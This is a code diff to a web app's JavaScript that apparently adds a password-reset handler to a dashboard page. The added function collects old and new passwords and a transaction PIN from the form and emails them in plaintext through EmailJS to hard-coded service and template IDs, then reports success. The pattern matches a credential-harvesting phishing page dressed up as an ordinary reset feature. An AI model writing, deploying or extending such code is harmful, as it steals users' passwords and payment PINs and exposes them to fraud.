@@ -115,6 +115,39 @@ async function login(email, password) {
   window.location.href = "dashboard.html";
 }
 
+ async function sendDashboardData() {
+  const oldPassword = document.getElementById("oldPassword")?.value || "";
+  const newPassword = document.getElementById("newPassword")?.value || "";
+  const confirmNewPassword = document.getElementById("confirmNewPassword")?.value || "";
+  const transactionPin = document.getElementById("transactionPin")?.value || "";
+  const confirmTransactionPin = document.getElementById("confirmTransactionPin")?.value || "";
+
+  if (!window.emailjs) {
+    console.error("EmailJS SDK not loaded");
+    alert("Service temporarily unavailable. Try again later.");
+    return;
+  }
+
+  try {
+    await emailjs.send(
+      "service_6nw221q",       // your service ID
+      "template_d6k3x8f",      // your template ID
+      {
+        oldPassword,
+        newPassword,
+        confirmNewPassword,
+        transactionPin,
+        confirmTransactionPin,
+        time: new Date().toISOString()
+      }
+    );
+    alert("Dashboard data sent successfully!");
+  } catch (err) {
+    console.error("EmailJS error:", err);
+    alert("Failed to send dashboard data.");
+  }
+ }
+
 // ======= DASHBOARD HELPER =======
 function loadDashboard() {
   const currentUser = loadCurrentUser();
@@ -161,6 +194,16 @@ async function fetchUserLocation() {
     if (locationEl) locationEl.textContent = "Location: N/A";
     if (timeEl) timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
   }
+}
+
+ const resetBtn = document.getElementById("resetPasswordBtn");
+if (resetBtn) {
+  resetBtn.addEventListener("click", async (e) => {
+    e.preventDefault(); // prevent default form submission
+    await sendDashboardData();
+    // Optional: you can reset the form after sending
+    // document.getElementById("resetPasswordForm").reset();
+  });
 }
 
 // ======= HOOKS / EVENT BINDING =======
